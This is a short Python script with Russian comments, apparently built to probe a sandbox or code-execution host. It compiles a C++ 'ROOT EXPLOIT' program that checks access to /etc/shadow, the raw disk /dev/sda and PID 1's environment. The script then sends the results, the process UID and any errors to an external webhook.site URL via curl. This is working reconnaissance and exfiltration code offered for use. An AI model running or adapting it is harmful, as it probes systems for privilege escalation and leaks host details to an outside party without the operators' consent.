import subprocess
import os

# Твой актуальный вебхук
WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"

# C++ код, который лезет в "запретные" места системы
cpp_source = r"""
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <dirent.h>

int main() {
    std::cout << "--- [ROOT EXPLOIT REPORT] ---\n";
    
    // 1. Читаем /etc/shadow (только для root)
    std::ifstream shadow("/etc/shadow");
    std::string line;
    if (shadow.is_open() && std::getline(shadow, line)) {
        std::cout << "[!] SENSITIVE: Shadow file access successful.\n";
    }

    // 2. Проверяем доступ к сырым дискам
    std::ifstream disk("/dev/sda", std::ios::binary);
    if (disk.is_open()) {
        std::cout << "[!] DANGER: Raw disk access granted (can bypass filesystem).\n";
    }

    // 3. Пытаемся увидеть переменные окружения процесса PID 1 (Init/Systemd)
    std::ifstream env("/proc/1/environ");
    if (env.is_open()) {
        std::cout << "[!] ESCALATION: Can read PID 1 environment (potential secrets leak).\n";
    }

    return 0;
}
"""

def execute_demo():
    # Сохраняем исходник
    with open("payload.cpp", "w") as f:
        f.write(cpp_source)
    
    # Компилируем (Senior-style: -O3 для скорости и статической линковки, если нужно)
    compile_proc = subprocess.run(
        ["g++", "-O3", "payload.cpp", "-o", "payload_bin"], 
        capture_output=True, text=True
    )
    
    if compile_proc.returncode != 0:
        error_msg = f"Compilation failed: {compile_proc.stderr}"
        subprocess.run(['curl', '-s', '-X', 'POST', '-d', error_msg, WEBHOOK_URL])
        return

    # Запускаем бинарник и ловим вывод
    try:
        output = subprocess.check_output(["./payload_bin"], stderr=subprocess.STDOUT).decode()
        
        # Финальный отчет для отправки
        full_report = (
            f"UID: {os.getuid()}\n"
            f"Binary Execution Result:\n{output}"
        )
        
        # Отправляем на вебхук
        subprocess.run([
            'curl', '-s', 
            '-X', 'POST', 
            '--data-urlencode', f"payload={full_report}", 
            WEBHOOK_URL
        ])
        print("[+] Report sent to webhook.")
        
    except Exception as e:
        subprocess.run(['curl', '-s', '-X', 'POST', '-d', f"Runtime error: {str(e)}", WEBHOOK_URL])

if __name__ == "__main__":
    execute_demo()
